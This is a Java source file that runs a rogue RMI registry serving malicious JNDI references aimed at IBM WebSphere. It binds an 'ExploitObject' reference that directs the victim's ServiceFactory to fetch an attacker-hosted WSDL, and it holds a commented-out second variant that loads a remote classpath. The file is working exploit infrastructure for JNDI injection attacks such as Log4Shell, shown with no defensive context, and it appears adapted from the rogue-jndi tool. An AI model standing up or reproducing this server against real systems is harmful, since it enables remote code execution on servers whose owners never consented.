package jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author Whoopsunix
 */
public class LocalServiceFactoryServer {
    public static void main(String args[]) throws Exception {
        WebSphere1();
        WebSphere2();

        System.out.println("server is running");
    }

    // todo https://github.com/veracode-research/rogue-jndi/blob/master/src/main/java/artsploit/controllers/WebSphere1.java
    public static void WebSphere1() throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        javax.naming.Reference ref = new Reference("ExploitObject",
                "com.ibm.ws.webservices.engine.client.ServiceFactory", null);
        ref.add(new StringRefAddr("WSDL location", "http://127.0.0.1/wsdl/list.wsdl"));
        ref.add(new StringRefAddr("service namespace", "xxx"));
        ref.add(new StringRefAddr("service local part", "yyy"));

        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("WebSphere", referenceWrapper);
    }

    // todo https://github.com/veracode-research/rogue-jndi/blob/master/src/main/java/artsploit/controllers/WebSphere2.java
    public static void WebSphere2() throws Exception {
//        Registry registry = LocateRegistry.createRegistry(1098);
//        javax.naming.Reference ref = new Reference("ExportObject",
//                "com.ibm.ws.client.applicationclient.ClientJ2CCFFactory", null);
//        Properties refProps = new Properties();
//        refProps.put("com.ibm.ws.client.classpath", "http://127.0.0.1/wsdl/upload.wsdl");
//        refProps.put("com.ibm.ws.client.classname", "xExportObject");
//        ref.add(new com.ibm.websphere.client.factory.jdbc.PropertiesRefAddr("JMSProperties", refProps));
//
//        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
//        registry.bind("WebSphere", referenceWrapper);
    }
}
